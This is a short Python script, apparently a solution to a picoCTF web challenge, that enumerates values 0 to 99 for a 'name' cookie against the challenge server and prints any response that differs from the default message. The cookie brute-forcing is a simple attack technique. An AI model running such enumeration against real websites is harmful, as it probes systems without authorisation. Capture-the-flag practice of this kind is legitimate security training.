import requests
s = requests.Session()
url = "http://mercury.picoctf.net:64944/check"
for i in range(100):
    r = s.get(url,cookies={"PHPSESSID":"s7qsocpibtqrrp3uc702lu609a","name":f"{str(i)}"})
    if "That is a cookie! Not very special though..." not in r.text:
        print(r.text)